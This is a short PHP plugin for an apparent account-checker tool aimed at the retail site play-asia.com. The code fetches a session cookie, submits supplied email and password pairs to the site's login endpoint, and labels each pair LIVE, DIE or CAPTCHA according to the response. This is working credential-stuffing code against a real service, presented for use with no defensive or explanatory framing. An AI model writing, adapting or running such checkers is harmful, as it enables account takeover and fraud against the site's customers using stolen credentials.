<?php
class check_playasia extends plugins {
	public $meta = array(
		'id' 	=> "playasia",
		'name' => "Check playasia",
		'version' => "1.0.0",
		'descrition' =>"Check playasia acc"
	);

	public $fields = array(
		"status" => "str"
	);

	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass);
	}

	private function runCheck($m,$p) {
		$session = new Session();

		$return = array();

		$url = "https://www.play-asia.com/login/";

		$html = $session->connect($url);

		if (!preg_match('/setCookie\(\'(.+?)\', \'(.+?)\'/i',$html,$match)) {
			$return['status'] = "ERROR";
			return $return;
		}

		$cookie = array(CURLOPT_HTTPHEADER => array("Cookie: ".$match[1]."=".$match[2].";path=/;host=www.play-asia.com"));

		$html = $session->connect($url,$url,null,$cookie);

		if (strpos($html, "recaptcha_widget_div") !== false) {
			$return['status'] = "CAPTCHA";
			return $return;
		}

		$data = $session->get_field($html,"login");

		$data["email_address"] = $m;
		$data["password"] = $p;

		$html = $session->connect("https://www.play-asia.com/login/28process",$url,$data,$cookie);

		if (strpos($html,'Set-Cookie: recommend2=') === false) {
			$return['status'] = "DIE";
			return $return;
		}

		$return['status'] = "LIVE";
		return $return;
	}

}
?>
